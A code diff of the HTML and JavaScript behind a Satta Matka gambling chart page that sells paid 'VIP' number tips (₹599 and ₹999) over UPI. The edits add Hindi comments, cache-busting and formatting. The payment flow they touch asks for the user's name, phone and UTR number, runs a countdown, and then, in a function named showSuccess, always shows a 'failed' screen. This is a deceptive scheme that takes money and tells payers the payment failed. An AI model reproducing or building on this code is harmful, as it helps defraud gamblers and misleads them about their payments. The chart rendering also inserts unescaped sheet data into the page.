@@ -140,7 +140,7 @@
                     <input type="radio" name="subPlan" value="599" onclick="updateAmt(599)">
                     <div class="plan-content-box">
                         <span class="plan-main-text">2. close do ank ke liye charge -599</span>
-                        <span class="plan-sub-text">क्लोज़ दो अंक के लिए चार्ज - ₹599</span>
+                        <span class="plan-sub-text">क्लोज़ दो अंक के लिए चार्ज - ₹599</span>
                     </div>
                 </label>
 
@@ -156,7 +156,7 @@
                     <input type="radio" name="subPlan" value="999" onclick="updateAmt(999)">
                     <div class="plan-content-box">
                         <span class="plan-main-text">4. do jodi singal ke liye charge -999</span>
-                        <span class="plan-sub-text">दो जोड़ी सिंगल के लिए चार्ज - ₹999</span>
+                        <span class="plan-sub-text">दो जोड़ी सिंगल के लिए चार्ज - ₹999</span>
                     </div>
                 </label>
             </div>
@@ -183,6 +183,7 @@
 </div>
 
 <script>
+    // CSV URL को सुरक्षित और फ्रेश रखने के लिए बदलाव
     const CSV_URL = "https://docs.google.com/spreadsheets/d/1IReRyQjRvWWVjZTym_8DDXvx9Jttjfgy18McY53gM5w/export?format=csv";
 
     function openVipModal() { document.getElementById('vipModal').style.display = 'flex'; resetSteps(); }
@@ -194,13 +195,17 @@
         document.getElementById('stepFailed').style.display = 'none';
     }
     function updateAmt(val) { document.getElementById('displayAmt').innerText = "₹" + val; }
+    
     function goToPayment() {
-        if(document.getElementById('userName').value.trim() === "" || document.getElementById('userPhone').value.length < 10) {
+        const name = document.getElementById('userName').value.trim();
+        const phone = document.getElementById('userPhone').value.trim();
+        if(name === "" || phone.length < 10) {
             alert("कृपया नाम और सही मोबाइल नंबर भरें।"); return;
         }
         document.getElementById('stepInfo').style.display = 'none';
         document.getElementById('stepPay').style.display = 'block';
     }
+
     function startTimerProcess() {
         const utr = document.getElementById('utrInput').value;
         if(utr.length < 10) { alert("कृपया सही 12-अंकों का UTR नंबर डालें।"); return; }
@@ -217,46 +222,66 @@
             timeLeft--;
         }, 1000);
     }
+
     function showSuccess() {
         document.getElementById('stepTimer').style.display = 'none';
         document.getElementById('stepFailed').style.display = 'block';
     }
+
     async function loadChart() {
         const gridBody = document.getElementById('gridData');
         try {
-            const res = await fetch(CSV_URL + "&cb=" + Date.now());
+            // Cache रोकने के लिए timestamp का इस्तेमाल
+            const res = await fetch(CSV_URL + "&t=" + new Date().getTime());
+            if(!res.ok) throw new Error();
             const data = await res.text();
+            
+            // डेटा को क्लीन करना
             const rows = data.split(/\r?\n/).filter(r => r.trim() !== '').map(r => r.split(','));
             let html = '';
             let lockPlaced = false;
+
             for(let i = 1; i < rows.length; i++) {
                 let dt = (rows[i][0] || "").replace(/"/g, "").trim();
                 if(!dt) continue;
                 html += `<tr><td class="date-box">${dt}</td>`;
+                
+                // 6 कॉलम (Mon to Sat) के लिए डेटा
                 for(let j = 1; j <= 16; j += 3) {
                     let lp = (rows[i][j] || "").trim().replace(/"/g, "");
                     let jd = (rows[i][j+1] || "").trim().replace(/"/g, "");
                     let rp = (rows[i][j+2] || "").trim().replace(/"/g, "");
+                    
                     if(!lp && !jd && !rp) {
                         if(!lockPlaced) {
-                            html += `<td onclick="openVipModal()"><span class="single-vip-lock">🔒</span></td>`;
+                            html += `<td onclick="openVipModal()" style="cursor:pointer;"><span class="single-vip-lock">🔒</span></td>`;
                             lockPlaced = true;
-                        } else { html += `<td></td>`; }
+                        } else { 
+                            html += `<td></td>`; 
+                        }
                     } else {
                         let isRed = false;
-                        if(jd.length === 2) {
+                        if(jd && jd.length === 2) {
                             let d1 = parseInt(jd[0]), d2 = parseInt(jd[1]);
                             if(d1 === d2 || Math.abs(d1 - d2) === 5) isRed = true;
                         }
                         let lpS = lp.split('').map(s => `<span>${s}</span>`).join('');
                         let rpS = rp.split('').map(s => `<span>${s}</span>`).join('');
-                        html += `<td class="${isRed ? 'red-house' : ''}"><div class="cell-content"><div class="panna left">${lpS}</div><div class="jodi">${jd}</div><div class="panna right">${rpS}</div></div></td>`;
+                        html += `<td class="${isRed ? 'red-house' : ''}">
+                                    <div class="cell-content">
+                                        <div class="panna left">${lpS}</div>
+                                        <div class="jodi">${jd}</div>
+                                        <div class="panna right">${rpS}</div>
+                                    </div>
+                                 </td>`;
                     }
                 }
                 html += `</tr>`;
             }
             gridBody.innerHTML = html;
-        } catch(e) { gridBody.innerHTML = '<tr><td colspan="7">Error loading.</td></tr>'; }
+        } catch(e) { 
+            gridBody.innerHTML = '<tr><td colspan="7" style="color:red; padding:20px;">चार्ट लोड नहीं हुआ। कृपया पेज रिफ्रेश करें।</td></tr>'; 
+        }
     }
     window.onload = loadChart;
 </script>
